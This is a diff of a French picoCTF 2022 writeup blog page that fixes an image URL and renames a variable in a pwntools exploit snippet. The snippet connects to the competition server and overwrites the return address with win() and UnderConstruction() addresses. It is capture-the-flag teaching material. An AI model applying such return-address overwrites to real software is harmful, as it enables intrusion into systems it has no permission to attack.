@@ -8,7 +8,7 @@
         <title>picoCTF2022 Writeup - R4v3N Blog</title><meta name="Description" content="Cet article présente des corrigés des défis du picoCTF 2022."><meta property="og:title" content="picoCTF2022 Writeup" />
 <meta property="og:description" content="Cet article présente des corrigés des défis du picoCTF 2022." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" /><meta property="og:image" content="https://raw.githubusercontent.com/w31rdr4v3n/w31rdr4v3n.github.io/main/fr/picoctf2022-writeup/picoctf-logo-social.png"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" /><meta property="og:image" content="https://raw.githubusercontent.com/w31rdr4v3n/w31rdr4v3n.github.io/main/picoctf2022-writeup/picoctf-logo-social.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-03-29T05:17:59+01:00" />
 <meta property="article:modified_time" content="2022-03-29T05:17:59+01:00" />
 
@@ -967,7 +967,7 @@ Comme <em>check</em> contient l&rsquo;adresse de <em>hard_checker</em>, on dimun
 
 <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;saturn.picoctf.net&#39;</span><span class="p">,</span> <span class="mi">56141</span><span class="p">)</span>
 
-<span class="n">rip</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049da0</span><span class="p">)</span> <span class="c1"># win()</span>
+<span class="n">eip</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049da0</span><span class="p">)</span> <span class="c1"># win()</span>
 <span class="n">esp</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049e20</span><span class="p">)</span> <span class="c1"># UnderConstruction()</span>
 
 <span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Give me a string that gets you the flag&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
